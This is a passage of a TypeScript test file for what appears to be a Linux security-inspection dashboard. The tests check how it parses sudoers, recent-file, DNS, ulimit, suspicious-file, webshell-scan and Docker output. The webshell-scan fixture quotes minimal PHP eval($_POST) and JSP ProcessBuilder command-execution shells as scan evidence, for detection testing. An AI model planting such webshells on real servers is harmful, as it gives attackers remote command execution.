        '%wheel ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('%wheel')).toBeInTheDocument();
      expect(screen.getByText('(ALL)')).toBeInTheDocument();
      expect(screen.getByText('/usr/bin/systemctl restart nginx')).toBeInTheDocument();
      expect(screen.getByText('nopasswd')).toBeInTheDocument();
    });
  });

  it('structures Linux recent files with path, directory, and risk category', async () => {
    renderRemoteModule(
      'recent_files',
      [
        '/root/.ssh/authorized_keys',
        '/tmp/payload.sh',
        '/home/www/index.php',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('authorized_keys')).toBeInTheDocument();
      expect(screen.getByText('/root/.ssh')).toBeInTheDocument();
      expect(screen.getByText('/tmp/payload.sh')).toBeInTheDocument();
      expect(screen.getByText('sensitive')).toBeInTheDocument();
      expect(screen.getByText('temporary')).toBeInTheDocument();
      expect(screen.getByText('webroot')).toBeInTheDocument();
    });
  });

  it('structures Linux DNS resolver configuration by directive type and value', async () => {
    renderRemoteModule(
      'dns_config',
      [
        'nameserver 8.8.8.8',
        'nameserver 1.1.1.1',
        'search corp.local example.local',
        'options timeout:2 attempts:3',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getAllByText('resolver').length).toBeGreaterThan(0);
      expect(screen.getByText('8.8.8.8')).toBeInTheDocument();
      expect(screen.getByText('search-domain')).toBeInTheDocument();
      expect(screen.getByText('corp.local, example.local')).toBeInTheDocument();
      expect(screen.getByText('resolver-option')).toBeInTheDocument();
      expect(screen.getAllByText('timeout:2 attempts:3').length).toBeGreaterThan(0);
    });
  });

  it('structures ulimit output and limits.conf rules into inspectable fields', async () => {
    renderRemoteModule(
      'ulimit_config',
      [
        'open files                      (-n) 1024',
        'max user processes              (-u) 4096',
        '===LIMITS_CONF===',
        '* soft nofile 65535',
        'root hard nproc 4096',
        '@admin - memlock unlimited',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getAllByText('ulimit').length).toBeGreaterThan(0);
      expect(screen.getAllByText('limits.conf').length).toBeGreaterThan(0);
      expect(screen.getByText('open files')).toBeInTheDocument();
      expect(screen.getAllByText('nofile').length).toBeGreaterThan(0);
      expect(screen.getByText('*')).toBeInTheDocument();
      expect(screen.getByText('@admin')).toBeInTheDocument();
      expect(screen.getAllByText('soft').length).toBeGreaterThan(0);
      expect(screen.getByText('memlock')).toBeInTheDocument();
      expect(screen.getByText('unlimited')).toBeInTheDocument();
    });
  });

  it('structures suspicious file scan output with category, risk, directory, and file name', async () => {
    renderRemoteModule(
      'suspicious_files',
      [
        '===SUID===',
        '/usr/bin/passwd',
        '===TEMP_EXE===',
        '/tmp/.cache/.x',
        '===WORLD_WRITABLE===',
        '/etc/cron.d/backdoor',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getAllByText('SUID/SGID提权风险').length).toBeGreaterThan(0);
      expect(screen.getAllByText('临时目录可执行文件').length).toBeGreaterThan(0);
      expect(screen.getAllByText('全局可写文件').length).toBeGreaterThan(0);
      expect(screen.getAllByText('高危').length).toBeGreaterThan(0);
      expect(screen.getByText('passwd')).toBeInTheDocument();
      expect(screen.getByText('/usr/bin')).toBeInTheDocument();
      expect(screen.getByText('.x')).toBeInTheDocument();
      expect(screen.getByText('/tmp/.cache')).toBeInTheDocument();
    });
  });

  it('structures webshell scan hits with language, rule, risk, and evidence snippet', async () => {
    renderRemoteModule(
      'webshell_scan',
      [
        '===PHP===',
        "/var/www/html/shell.php:12:<?php eval($_POST['x']); ?>",
        '===JSP===',
        '/www/root/cmd.jsp:8:new ProcessBuilder(request.getParameter("cmd")).start();',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('Webshell命中明细')).toBeInTheDocument();
      expect(screen.getAllByText('PHP').length).toBeGreaterThan(0);
      expect(screen.getAllByText('JSP').length).toBeGreaterThan(0);
      expect(screen.getByText('eval')).toBeInTheDocument();
      expect(screen.getByText('ProcessBuilder')).toBeInTheDocument();
      expect(screen.getAllByText('高危').length).toBeGreaterThan(0);
      expect(screen.getByText('shell.php')).toBeInTheDocument();
      expect(screen.getByText('cmd.jsp')).toBeInTheDocument();
    });
  });

  it('exports Docker container IDs from configured columns', async () => {
    let exportedBlob: Blob | undefined;
    Object.defineProperty(URL, 'createObjectURL', {
      writable: true,
      value: vi.fn((blob: Blob) => {
        exportedBlob = blob;
        return 'blob:test-docker-csv';
      }),
    });
    Object.defineProperty(URL, 'revokeObjectURL', {
      writable: true,
      value: vi.fn(),
    });

    renderRemoteModule(
      'docker',
      'abc1234567890abcdef|nginx:1.25|Up 2 hours|web|0.0.0.0:80->80/tcp',
    );

    await waitFor(() => {
      expect(screen.getByText('abc123456789')).toBeInTheDocument();
    });

    fireEvent.click(screen.getByRole('button', { name: /导出/ }));

    await waitFor(() => {
      expect(exportedBlob).toBeDefined();
    });

    const csv = await new Promise<string>((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(String(reader.result));
      reader.onerror = () => reject(reader.error);
      reader.readAsText(exportedBlob!);
    });

    expect(csv).toContain('abc123456789');
    expect(csv).toContain('nginx:1.25');
    expect(csv).toContain('0.0.0.0:80->80/tcp');
  });

  it('exports Docker image IDs from configured columns', async () => {
    let exportedBlob: Blob | undefined;
    Object.defineProperty(URL, 'createObjectURL', {
      writable: true,
      value: vi.fn((blob: Blob) => {
        exportedBlob = blob;
        return 'blob:test-docker-images-csv';
      }),
    });
    Object.defineProperty(URL, 'revokeObjectURL', {
      writable: true,
      value: vi.fn(),
    });

    renderRemoteModule(
      'docker_images',
      'nginx|1.25|sha256:1234567890abcdef|187MB|2026-05-26 19:00:00 +0800 CST',
    );

    await waitFor(() => {
      expect(screen.getByText('sha256:12345')).toBeInTheDocument();
    });

    fireEvent.click(screen.getByRole('button', { name: /导出/ }));

    await waitFor(() => {
      expect(exportedBlob).toBeDefined();
    });

    const csv = await new Promise<string>((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(String(reader.result));
      reader.onerror = () => reject(reader.error);
      reader.readAsText(exportedBlob!);
    });

    expect(csv).toContain('sha256:12345');
    expect(csv).toContain('nginx');
    expect(csv).toContain('187MB');
  });

  it.each([
    ['service_list', 'UNIT LOAD ACTIVE SUB DESCRIPTION'],
    ['startup', 'UNIT FILE STATE PRESET\n0 unit files listed.'],
    ['network_conn', 'Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port'],
    ['disk_info', 'Filesystem Size Used Avail Use% Mounted on'],
    ['logged_users', '---LAST---\nwtmp begins Tue May 26 00:00:00 2026'],
    ['ulimit_config', '# no explicit limits'],
    ['process_list', 'USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND'],
    ['user_list', '# no passwd entries'],
    ['history_cmd', ': 0:0;ignored'],
    ['cron', '# no cron records\nSHELL=/bin/bash'],
    ['selinux_status', '# no security status output'],
    ['docker', 'CONTAINER ID IMAGE STATUS NAMES PORTS'],
    ['docker_images', 'REPOSITORY TAG IMAGE ID CREATED SIZE'],
    ['web_access_log', '-- No entries --'],
    ['database', '===MYSQL_VERSION===\n===MYSQL_STATUS===\n===MYSQL_DATABASES===\n===MYSQL_USERS==='],
    ['process_anomaly', '===HIDDEN===\n===DELETED===\n===SENSITIVE_PATH===\n===HIGH_RESOURCES===\nUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND'],
  ])('shows a diagnostic when Linux %s returns no displayable records', async (moduleKey, stdout) => {
    renderRemoteModule(moduleKey, stdout);

    await waitFor(() => {
      expect(screen.getByText('采集诊断')).toBeInTheDocument();
      expect(screen.getByText('未发现记录')).toBeInTheDocument();
      expect(screen.getAllByText(new RegExp(moduleKey)).length).toBeGreaterThan(0);
    });
  });
});
